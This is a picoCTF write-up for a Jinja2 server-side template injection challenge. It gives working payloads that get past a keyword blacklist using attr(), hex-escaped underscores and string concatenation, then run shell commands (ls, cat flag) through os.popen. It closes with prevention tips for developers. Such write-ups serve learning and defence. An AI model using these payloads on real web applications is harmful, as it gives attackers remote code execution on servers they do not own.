
# 🧠 SSTI CTF Challenge Writeup – SSTI2

**Platform:** picoCTF  
**Challenge Name:** SSTI2  
**Category:** Web Exploitation  
**Points:** 200  
**Date:** 2025-06-27

---

## 📝 Challenge Description

> I made a cool website where you can announce whatever you want!  
> I read about input sanitization, so now I remove any kind of characters that could be a problem :)

---

## 🔍 Initial Observations

- User input is rendered in the template
- Basic math payload works → **SSTI confirmed**
- Some keywords trigger: `"Stop trying to break me >:("`

---

## ✅ Exploitation Steps

### 1. SSTI Confirmed
```jinja2
{{ 7 * 7 }}
```
**Output:**
```
49
```

---

### 2. Access Internal Variables
```jinja2
{{ config }}
```

---

### 3. Bypass WAF / Filters

Blocked:
```jinja2
{{ config.__class__ }}
```

Bypass using `attr()` and hex:
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}
```

Full chain with command execution:
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('__import__')('os')|attr('popen')('ls')|attr('read')() }}
```

---

### 4. Discover Flag File
**Output:**
```
__pycache__  app.py  flag  requirements.txt
```

---

### 5. Read the Flag with String Obfuscation
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('__import__')('os')|attr('popen')('c' ~ 'at fl' ~ 'ag')
|attr('read')() }}
```

---

## 🧠 What I Learned

- Detecting and exploiting Server-Side Template Injection
- Using Jinja2 context (`request`, `config`, etc.)
- Evading blacklists with:
  - `|attr()`
  - Hex for `__`
  - String concat (`'c' ~ 'at'`)
- Achieving RCE with `popen().read()`

---

## 🛡 Prevention Tips (for Devs)

- Never render unsanitized user input into templates
- Use sandboxed rendering or static rendering engines
- Escape all input using proper template escaping
- Favor whitelisting over blacklisting

---

## 🏁 Flag

```
picoCTF{example_fake_flag_here}
```

---

## 📁 Repo Structure Suggestion

```
writeups/
├── picoCTF_2025/
│   └── SSTI2/
│       ├── README.md
│       └── screenshot.png
```

---

## 📌 References

- [Payload All The Things – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Jinja2 Docs](https://jinja.palletsprojects.com/)
